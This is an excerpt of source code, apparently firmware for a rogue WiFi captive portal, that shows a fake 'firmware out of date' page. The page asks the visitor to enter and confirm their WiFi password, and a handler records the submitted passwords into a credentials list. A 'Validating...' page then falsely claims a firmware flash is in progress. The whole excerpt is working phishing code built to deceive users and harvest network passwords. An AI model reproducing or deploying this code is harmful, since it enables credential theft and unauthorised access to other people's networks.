...
#define BODY "Your router's firmware is out of date! Please input password to verify update."
#define POST_TITLE "Validating..."
#define POST_BODY "Your password is being validated. Please, wait allow up to 5 minutes for a firmware flash to complete.</br>Thank you for your patience!"
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<b>Wifi Password:</b> <center><input type=password autocomplete=password name=password></input></center>" +
    "<b>Verify Wifi Password:</b> <center><input type=password name=verifypassword></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}
...
String posted() {
  ...
  String verifypassword=input("verifypassword");
  Credentials="<li>Password: <b>" + password + "</b></br>Verify Password: <b>" + verifypassword + "</b></li>" + Credentials;
...
//    return header(TITLE) + "<div>" + POST_BODY + "</ol></div>" + footer();
//}
